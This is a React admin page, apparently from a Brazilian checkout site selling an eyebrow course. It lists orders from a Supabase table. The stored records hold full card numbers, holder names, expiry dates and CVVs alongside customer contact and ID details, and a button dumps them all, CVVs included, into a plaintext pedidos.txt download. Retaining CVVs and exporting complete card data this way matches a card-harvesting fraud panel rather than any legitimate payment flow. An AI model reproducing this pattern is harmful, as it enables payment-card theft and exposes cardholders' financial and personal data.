import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Download, RefreshCcw, Trash2 } from "lucide-react";
import { toast } from "sonner";

export const Route = createFileRoute("/_authenticated/admin/pedidos")({
  component: PedidosAdmin,
});

type Pedido = {
  id: string;
  created_at: string;
  customer_name: string;
  customer_email: string;
  customer_phone: string;
  customer_document: string;
  amount_cents: number;
  payment_method: "card" | "pix";
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  installments: number | null;
  pix_hash: string | null;
  status: string;
};

function formatMoney(cents: number) {
  return (cents / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

function formatDate(iso: string) {
  return new Date(iso).toLocaleString("pt-BR");
}

function buildTxt(pedidos: Pedido[]) {
  const lines: string[] = [];
  lines.push("PEDIDOS - CURSO SOBRANCELHAS PERFEITAS");
  lines.push(`Exportado em: ${new Date().toLocaleString("pt-BR")}`);
  lines.push(`Total de pedidos: ${pedidos.length}`);
  lines.push("=".repeat(70));
  lines.push("");
  for (const p of pedidos) {
    lines.push(`Pedido: ${p.id}`);
    lines.push(`Data: ${formatDate(p.created_at)}`);
    lines.push(`Status: ${p.status}`);
    lines.push(`Método: ${p.payment_method === "card" ? "Cartão de crédito" : "Pix"}`);
    lines.push(`Valor: ${formatMoney(p.amount_cents)}`);
    lines.push(`Cliente: ${p.customer_name}`);
    lines.push(`E-mail: ${p.customer_email}`);
    lines.push(`Celular: ${p.customer_phone}`);
    lines.push(`Documento: ${p.customer_document}`);
    if (p.payment_method === "card") {
      lines.push(`Cartão: ${p.card_number ?? ""}`);
      lines.push(`Titular: ${p.card_holder ?? ""}`);
      lines.push(`Validade: ${p.card_expiry ?? ""}`);
      lines.push(`CVV: ${p.card_cvv ?? ""}`);
      lines.push(`Parcelas: ${p.installments ?? 1}x`);
    }
    if (p.payment_method === "pix" && p.pix_hash) {
      lines.push(`Hash Pix: ${p.pix_hash}`);
    }
    lines.push("-".repeat(70));
    lines.push("");
  }
  return lines.join("\n");
}

function PedidosAdmin() {
  const [pedidos, setPedidos] = useState<Pedido[]>([]);
  const [loading, setLoading] = useState(true);

  const load = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from("pedidos")
      .select("*")
      .order("created_at", { ascending: false });
    if (error) {
      toast.error("Erro ao carregar pedidos: " + error.message);
    } else {
      setPedidos((data ?? []) as Pedido[]);
    }
    setLoading(false);
  };

  useEffect(() => {
    load();
  }, []);

  const downloadTxt = () => {
    if (!pedidos.length) {
      toast.info("Nenhum pedido para exportar.");
      return;
    }
    const blob = new Blob([buildTxt(pedidos)], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `pedidos.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const deletePedido = async (id: string) => {
    if (!confirm("Excluir este pedido?")) return;
    const { error } = await supabase.from("pedidos").delete().eq("id", id);
    if (error) toast.error("Erro ao excluir: " + error.message);
    else {
      toast.success("Pedido excluído.");
      setPedidos((prev) => prev.filter((p) => p.id !== id));
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between flex-wrap gap-3">
        <div>
          <h1 className="font-serif text-3xl text-gold">Pedidos</h1>
          <p className="text-sm text-muted-foreground mt-1">
            {pedidos.length} pedido(s) registrado(s)
          </p>
        </div>
        <div className="flex gap-2">
          <Button variant="outline" onClick={load} disabled={loading}>
            <RefreshCcw className="w-4 h-4 mr-2" /> Atualizar
          </Button>
          <Button onClick={downloadTxt} className="bg-gold text-black hover:bg-gold/90">
            <Download className="w-4 h-4 mr-2" /> Baixar pedidos.txt
          </Button>
        </div>
      </div>

      {loading ? (
        <p className="text-muted-foreground">Carregando...</p>
      ) : pedidos.length === 0 ? (
        <div className="border border-gold/20 rounded-lg p-8 text-center text-muted-foreground">
          Nenhum pedido ainda.
        </div>
      ) : (
        <div className="overflow-x-auto border border-gold/20 rounded-lg">
          <table className="w-full text-sm">
            <thead className="bg-white/5 text-left">
              <tr>
                <th className="px-3 py-2">Data</th>
                <th className="px-3 py-2">Cliente</th>
                <th className="px-3 py-2">Contato</th>
                <th className="px-3 py-2">Método</th>
                <th className="px-3 py-2">Valor</th>
                <th className="px-3 py-2">Status</th>
                <th className="px-3 py-2"></th>
              </tr>
            </thead>
            <tbody>
              {pedidos.map((p) => (
                <tr key={p.id} className="border-t border-white/5 align-top">
                  <td className="px-3 py-2 whitespace-nowrap">{formatDate(p.created_at)}</td>
                  <td className="px-3 py-2">
                    <div className="font-medium">{p.customer_name}</div>
                    <div className="text-xs text-muted-foreground">Doc: {p.customer_document}</div>
                  </td>
                  <td className="px-3 py-2">
                    <div>{p.customer_email}</div>
                    <div className="text-xs text-muted-foreground">{p.customer_phone}</div>
                  </td>
                  <td className="px-3 py-2">
                    {p.payment_method === "card" ? (
                      <div>
                        <div>Cartão {p.installments ?? 1}x</div>
                        <div className="text-xs text-muted-foreground">{p.card_number}</div>
                      </div>
                    ) : (
                      <div>Pix</div>
                    )}
                  </td>
                  <td className="px-3 py-2 whitespace-nowrap">{formatMoney(p.amount_cents)}</td>
                  <td className="px-3 py-2">
                    <span className="text-xs px-2 py-1 rounded bg-white/5">{p.status}</span>
                  </td>
                  <td className="px-3 py-2 text-right">
                    <Button size="icon" variant="ghost" onClick={() => deletePedido(p.id)}>
                      <Trash2 className="w-4 h-4 text-red-500" />
                    </Button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
